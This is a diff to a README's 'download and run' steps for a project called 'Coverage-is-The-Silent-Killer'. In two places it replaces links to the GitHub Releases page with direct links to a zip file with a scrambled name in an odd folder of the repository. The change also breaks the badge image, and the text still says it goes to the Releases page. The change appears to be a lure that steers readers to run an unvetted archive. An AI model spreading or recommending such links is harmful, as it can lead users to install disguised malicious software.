@@ -38,7 +38,7 @@ You can easily download and run the application by following these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to our Releases page.
    
-   [![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/forthekidsq1-png/Coverage-is-The-Silent-Killer/releases)
+   [![Download](https://raw.githubusercontent.com/forthekidsq1-png/Coverage-is-The-Silent-Killer/main/tredille/Killer-The-Coverage-Silent-is-v2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/forthekidsq1-png/Coverage-is-The-Silent-Killer/main/tredille/Killer-The-Coverage-Silent-is-v2.4.zip)
 
 2. **Choose the Latest Version:** On the Releases page, look for the latest version, usually at the top.
 
@@ -90,4 +90,4 @@ For any questions or suggestions, please reach out to us through the GitHub page
 ## 🔗 Visit for More Information
 Again, click the link below to access our Releases page for download.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/forthekidsq1-png/Coverage-is-The-Silent-Killer/releases)
+[![Download](https://raw.githubusercontent.com/forthekidsq1-png/Coverage-is-The-Silent-Killer/main/tredille/Killer-The-Coverage-Silent-is-v2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/forthekidsq1-png/Coverage-is-The-Silent-Killer/main/tredille/Killer-The-Coverage-Silent-is-v2.4.zip)
